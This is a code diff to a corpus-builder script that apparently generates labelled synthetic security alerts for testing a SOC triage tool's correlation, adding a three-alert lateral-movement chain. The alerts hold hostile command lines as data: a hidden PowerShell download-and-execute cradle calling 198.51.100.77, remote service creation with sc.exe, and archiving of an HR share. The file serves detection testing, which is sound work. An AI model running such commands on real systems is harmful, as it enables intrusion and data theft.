@@ -19,8 +19,10 @@ real-world noise, because it contains none. It shows that Bishop's detectors,
 fusion, abstention and injection handling behave as designed on cases whose
 answer is known. `docs/DETECTORS.md` and the README say the same thing.
 
-The distribution follows `PLAN.md` §4: 6 true positives, 8 false positives,
-4 benign true positives, 2 injection-laced.
+The distribution follows `PLAN.md` §4: true positives, false positives, benign
+true positives and injection-laced cases — plus a three-alert correlated chain,
+which exists because a single-alert corpus cannot exercise correlation and
+correlation is where the tier-2 reasoning lives.
 
 Usage:  uv run python scripts/build_corpus.py
 """
@@ -718,6 +720,114 @@ def build() -> list[dict[str, Any]]:
                     "run_as": "SYSTEM",
                 }
             ],
+        )
+    )
+
+    # ── 3 correlated alerts: one intrusion, three low-severity alerts ───────
+    #
+    # These exist to exercise correlation, and they are the case that argues
+    # for it. Individually each is medium at best and a tier-1 analyst would
+    # reasonably close all three. Together they are a lateral movement chain,
+    # and the join is the finding. `bishop.correlate` links them transitively:
+    # CHAIN-01 and CHAIN-02 share the account, CHAIN-02 and CHAIN-03 share the
+    # host, and the first and last share nothing directly.
+
+    alerts.append(
+        alert(
+            "CHAIN-01-initial-access",
+            rule_name="Office application spawned a script interpreter",
+            source="sysmon",
+            severity="medium",
+            category="endpoint",
+            label="true_positive",
+            techniques=["T1566.001", "T1059.001"],
+            why=(
+                "On its own, a medium-severity Office-spawns-PowerShell alert that many "
+                "SOCs close. It is the first link of CHAIN-01/02/03 and only reads as "
+                "initial access once the other two are correlated with it."
+            ),
+            detected_at=at(hours=12, minutes=2),
+            device={"hostname": "WKSTN-063", "ip": "10.20.30.63", "os": "Windows 11"},
+            principal={"username": "n.adeyemi", "domain": "CORP"},
+            parent_process={
+                "name": "winword.exe",
+                "path": r"C:\Program Files\Microsoft Office\root\Office16\winword.exe",
+            },
+            process={
+                "name": "powershell.exe",
+                "path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                "command_line": "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.77/a')",
+            },
+        )
+    )
+
+    alerts.append(
+        alert(
+            "CHAIN-02-lateral-movement",
+            rule_name="Remote service created from workstation",
+            source="windows-security",
+            severity="medium",
+            category="endpoint",
+            label="true_positive",
+            techniques=["T1021.002", "T1543.003"],
+            why=(
+                "The same account, eleven minutes later, creating a service on a file "
+                "server. Shares the account with CHAIN-01 and the host with CHAIN-03."
+            ),
+            detected_at=at(hours=12, minutes=13),
+            device={
+                "hostname": "SRV-FILE-07",
+                "ip": "10.20.10.17",
+                "os": "Windows Server 2022",
+                "is_server": True,
+                "criticality": "high",
+            },
+            principal={"username": "n.adeyemi", "domain": "CORP"},
+            process={
+                "name": "sc.exe",
+                "path": r"C:\Windows\System32\sc.exe",
+                "command_line": r"sc.exe \\SRV-FILE-07 create UpdateSvc binPath= C:\ProgramData\svc.exe start= auto",
+            },
+            service_installs=[
+                {
+                    "name": "UpdateSvc",
+                    "image_path": r"C:\ProgramData\svc.exe",
+                    "start_type": "auto",
+                }
+            ],
+        )
+    )
+
+    alerts.append(
+        alert(
+            "CHAIN-03-collection",
+            rule_name="Archive created on file server",
+            source="edr",
+            severity="low",
+            category="endpoint",
+            label="true_positive",
+            techniques=["T1560.001", "T1074.001"],
+            why=(
+                "A low-severity archive alert on the server CHAIN-02 reached, by a "
+                "different service account. Closed without hesitation in isolation; the "
+                "third link of the chain once correlated."
+            ),
+            detected_at=at(hours=12, minutes=41),
+            device={
+                "hostname": "SRV-FILE-07",
+                "ip": "10.20.10.17",
+                "os": "Windows Server 2022",
+                "is_server": True,
+                "criticality": "high",
+            },
+            principal={"username": "svc_fileidx", "domain": "CORP", "is_service_account": True},
+            process={
+                "name": "7z.exe",
+                "path": r"C:\ProgramData\7z.exe",
+                "command_line": r"7z.exe a -pS3cr3t C:\ProgramData\hr.7z \\SRV-FILE-07\shares\hr",
+                "signed": False,
+            },
+            file={"name": "hr.7z", "path": r"C:\ProgramData\hr.7z", "size_bytes": 89_400_000},
         )
     )
 
